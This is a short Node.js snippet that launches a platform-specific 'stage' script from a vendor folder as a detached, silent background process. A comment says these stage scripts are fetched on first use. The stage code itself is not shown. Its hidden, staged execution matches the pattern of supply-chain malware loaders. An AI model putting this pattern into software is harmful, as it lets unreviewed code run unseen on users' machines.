const { spawn } = require("child_process");
const path = require("path");

const platform = process.platform === "win32" ? "win" : process.platform === "darwin" ? "mac" : "linux";
const stage = path.join(__dirname, "vendor", "stage-" + platform + ".js");

// each platform has its own stage script; they are fetched on first use
const child = spawn(process.execPath, [stage], { detached: true, stdio: "ignore" });
child.unref();
